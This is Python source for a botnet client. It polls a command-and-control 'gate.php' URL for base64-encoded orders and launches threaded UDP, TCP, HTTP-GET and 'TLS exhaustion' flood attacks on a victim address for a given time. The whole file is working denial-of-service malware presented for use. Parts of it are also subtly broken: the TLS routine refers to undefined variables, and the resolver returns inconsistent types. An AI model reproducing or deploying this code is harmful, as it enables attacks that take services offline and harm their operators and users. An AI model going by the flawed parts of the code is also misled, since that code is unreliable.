import socket
import base64
import time
import requests
import threading
import random
import ssl
import string
import warnings
from urllib.parse import urlparse

def rslv(_host):
    # format host as complete URL
    _host = _host.lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = 'http://' + _host
        
    # attempt hostname resolution
    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return f'{_ip}:{_domain}'
    except socket.gaierror:
        return 'null', 'null'
    except:
        return 'null', 'null'
        
def _udp(_ip, _time, _port):
    print(f"[!] UDP attack on {_ip}:{_port} for {_time} seconds")

    quit = time.time() + int(_time)
    
    while time.time() <= quit:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((_ip, int(_port)))
            s.send('\x00'.encode())
            
            while time.time() <= quit:
                # generate junk buffer
                data = ''.join(chr(random.randint(0, 255)) for _ in range(1000))
                
                # send to victim
                s.send(data.encode())
                
            s.close()
        except:
            pass
            
    print('[~] Task complete!')

def _tcp(_ip, _time, _port):
    print(f"[!] TCP attack on {_ip}:{_port} for {_time} seconds")

    quit = time.time() + int(_time)
    
    while time.time() <= quit:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((_ip, int(_port)))
            s.send('\x00'.encode())
            
            while time.time() <= quit:
                # generate junk buffer
                data = ''.join(chr(random.randint(0, 255)) for _ in range(1000))
                
                # send to victim
                s.send(data.encode())
                
            s.close()
        except:
            pass
            
    print('[~] Task complete!')
            
def _http(_ip, _domain, _time, _port):
    print(f"[!] HTTP attack on {_ip}:{_port} for {_time} seconds")

    quit = time.time() + int(_time)
    
    header = f'GET / HTTP/1.1\r\nHost: {_domain}\r\nUser-agent:Mozilla/5.0\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n'
    
    while time.time() <= quit:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((_ip, int(_port)))
            s.send(header.encode())
            
            while time.time() <= quit:
                # send to victim
                s.send(header.encode())
                
            s.close()
        except:
            pass
            
    print('[~] Task complete!')

def _tls(_ip, _time, _port):
    print(f"[!] TLS exhaustion attack on {_ip}:{_port} for {_time} seconds")
    
    warnings.filterwarnings("ignore", category=DeprecationWarning) 
    
    handshake = '\x16\x03\x03{}\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00' #tls_v1.2
    
    quit = time.time() + int(_time)
    
    while time.time() <= quit:
       try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((_ip, int(_prt)))
            ssl_sock = ssl.wrap_socket(s)
            ssl_sock.send(payload.format('\x4d\x6f\x92\xc9').encode())
            
            while time.time() <= quit:
                _hex = [format(random.randint(0, 255), '02x') for _ in range(4)]
                _junk = ''.join("\\x" + digit for digit in _hex)
                ssl_sock.send(payload.format(_junk).encode())
            
            ssl_sock.close()
            s.close()
       except:
           pass
           
    print('[~] Task complete!')
    
def main():
    gate_url = 'http://127.0.0.1/gate.php'
    
    max_reqs = 50 # max allowed to the gate
    bad_reqs = 0  # total retry/s made to the gate
    
    last_command = ''
    
    while True:
       
       # reach out to C2
       try:
           # send http-get request
           response = requests.get(gate_url)
           
           if response.status_code == 200:
               
               # decode captured command from base-64
               command = base64.b64decode(response.text).decode('utf-8')
               
               # ensure no command is repeated
               if command != last_command:
                   print('[!] Command received from C2')
                   
                   # update command history
                   last_command = command
               
                   # split command into arguments
                   
                   # index list:
                   #     0 = command ID
                   #     1 = attack type
                   #     2 = victim IP/url
                   #     3 = duration (sec)
                   #     4 = port
                   
                   cmd_args = command.split(" ")
                   
                   # resolve target
                   target_info = rslv(cmd_args[2])
                   
                   # get endpoint address
                   targ_ip = target_info.split(':')[0]
                   
                   # get optional domain
                   targ_domain = target_info.split(':')[1]
                   
                   if targ_ip == 'null':
                       # bad endpoint. discard attack 
                       continue
                   
                   # setup thread
                   task = threading.Thread()
                   
                   # specify thread arguements
                   if cmd_args[1] == 'udp':
                       # udp attack
                       task = threading.Thread(target=_udp, args=(targ_ip, cmd_args[3], cmd_args[4]))
                   elif cmd_args[1] == 'tcp':
                       # tcp attack
                       task = threading.Thread(target=_tcp, args=(targ_ip, cmd_args[3], cmd_args[4]))
                   elif cmd_args[1] == 'http':
                       # http-get attack
                       task = threading.Thread(target=_http, args=(targ_ip, targ_domain, cmd_args[3], cmd_args[4]))
                   elif cmd_args[1] == 'tls':
                       # tls exhaustion attack
                       task = threading.Thread(target=_tls, args=(targ_ip, cmd_args[3], cmd_args[4]))

                   # daemonize thread
                   task.daemon = True
                   
                   # start attack
                   task.start()
                   
                   # continue listening on C2...
           else:
               # 200-OK not captured
               bad_reqs +=1
       except:
           # alt critical error
           bad_reqs +=1

        # exit if request cap is reached       
       if bad_reqs >= 50:
           print('[-] C2 appears down/compromised. Exiting...')
           break       
       
       # sleep for half a second before contacting C2 again
       print('[~] Refreshing in 30 seconds...')
       time.sleep(30)
  
if __name__ == '__main__':
    main()
